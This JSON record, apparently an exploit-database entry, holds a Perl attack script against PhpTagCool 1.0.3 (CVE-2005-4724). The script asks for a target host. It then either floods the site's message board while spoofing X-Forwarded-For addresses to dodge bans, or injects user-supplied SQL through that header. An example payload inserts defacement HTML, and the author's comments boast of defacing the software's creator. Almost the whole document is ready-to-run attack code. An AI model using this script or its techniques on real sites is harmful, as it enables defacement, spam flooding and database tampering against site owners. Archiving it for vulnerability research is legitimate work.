{
  "id": "1211",
  "title": "PhpTagCool 1.0.3 - SQL Injection",
  "cve": "CVE-2005-4724",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n##  PhpTagCool Zatueritor 1.0\r\n##  Copyright: Megabyte www.mbytesecurity.org\r\n##  Greetz: Rootbox for discovering the forwarded-for issue\r\n##  Te amo Pandora\r\n##  Crashcool,fuiste defaceado por un bug de tu propia programacion,ahora que inventaras?\r\n \r\nuse IO::Socket;\r\n \r\n$x = 0;\r\n \r\nprint q(\r\nPhpTagCool Zatueritor 1.0\r\nby Megabyte\r\n \r\n);\r\nprint q(Host |sin http://www.| );\r\n$host = <STDIN>;\r\nchop ($host);\r\n \r\nprint q(Ruta |ejemplo. /phptagcool/ o /| );\r\n$pth = <STDIN>;\r\nchop ($pth);\r\n \r\nprint q(Tipo de Atake |1 = Posteo Masivo, 2 = Injeccion SQL| );\r\n$type = <STDIN>;\r\nchop ($type);\r\n \r\n## The Flood Attack\r\nif($type == 1){\r\n \r\n \r\nwhile($x != 255)\r\n{\r\n \r\n \r\n$nick = \"nick=megabyte\";\r\n \r\n## We generate our own ip address so we won't be banned  :) \r\n$ip = \"127.0.0\" . \"$x\";\r\n \r\n \r\n$postit = \"$nick\".\"&url=http%3A%2F%2Fwww.mbytesecurity.org&mensaje=FloodingLam\r\neTag&Submit=Enviar\";\r\n \r\n \r\n$lrg = length $postit;\r\n \r\n \r\nmy $sock = new IO::Socket::INET (\r\n                                 PeerAddr => \"$host\",\r\n                                 PeerPort => \"80\",\r\n                                 Proto => \"tcp\",\r\n                                );\r\ndie \"\\nNo se pudo conectar  :(  $!\\n\" unless $sock;\r\n \r\n## We Fake the X-Forwarded-For header,so we can post with multiple ip's\r\nprint $sock \"POST $pth\".\"mensajes.php HTTP/1.1\\n\";\r\nprint $sock \"Host: $host\\n\";\r\nprint $sock \"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwav\r\ne-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\\n\";\r\nprint $sock \"Referer: $host\\n\";\r\nprint $sock \"Accept-Language: en-us\\n\";\r\nprint $sock \"Content-Type: application/x-www-form-urlencoded\\n\";\r\nprint $sock \"Accept-Encoding: gzip, deflate\\n\";\r\nprint $sock \"User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox\r\n/1.0.4\\n\";\r\nprint $sock \"X-Forwarded-For: $ip\\n\";\r\nprint $sock \"Connection: Keep-Alive\\n\";\r\nprint $sock \"Cache-Control: no-cache\\n\";\r\nprint $sock \"Content-Length: $lrg\\n\\n\";\r\nprint $sock \"$postit\\n\";\r\nclose($sock);\r\n \r\n \r\nsyswrite STDOUT, \".\";\r\n \r\n \r\n$x++;\r\n}\r\n \r\n## The SQL injection attack  :) \r\n}\r\nelsif ($type == 2){\r\n \r\nprint q(Inyeccion a ejecutar Ejemplo 127.0.0.1'),('<h1>owned</h1>','http://mbytesecurity.\r\norg','leim','hoy','11 );\r\n$sql = <STDIN>;\r\nchop ($sql);\r\n \r\n \r\n \r\nmy $sock = new IO::Socket::INET (\r\n                                 PeerAddr => \"$host\",\r\n                                 PeerPort => \"80\",\r\n                                 Proto => \"tcp\",\r\n                                );\r\ndie \"\\nNo se pudo conectar  :(  $!\\n\" unless $sock;\r\n \r\n \r\nprint $sock \"POST $pth\".\"mensajes.php HTTP/1.1\\n\";\r\nprint $sock \"Host: $host\\n\";\r\nprint $sock \"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q\r\n=0.8,image/png,*/*;q=0.5\\n\";\r\nprint $sock \"Referer: $host\\n\";\r\nprint $sock \"Accept-Language: en-us\\n\";\r\nprint $sock \"Content-Type: application/x-www-form-urlencoded\\n\";\r\nprint $sock \"Accept-Encoding: gzip, deflate\\n\";\r\nprint $sock \"User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox\r\n/1.0.4\\n\";\r\nprint $sock \"Connection: Keep-Alive\\n\";\r\nprint $sock \"Cache-Control: no-cache\\n\";\r\nprint $sock \"Content-Length: $lrg\\n\\n\";\r\nprint $sock \"X-Forwarded-For: $sql\\n\";\r\nclose($sock);\r\n \r\n}else{\r\n \r\n\tdie \"Solo hay 2 opciones IMBECIL\\n\";\r\n}\r\n\r\n# milw0rm.com [2005-09-11]",
  "url": "https://www.exploit-db.com/exploits/1211"
}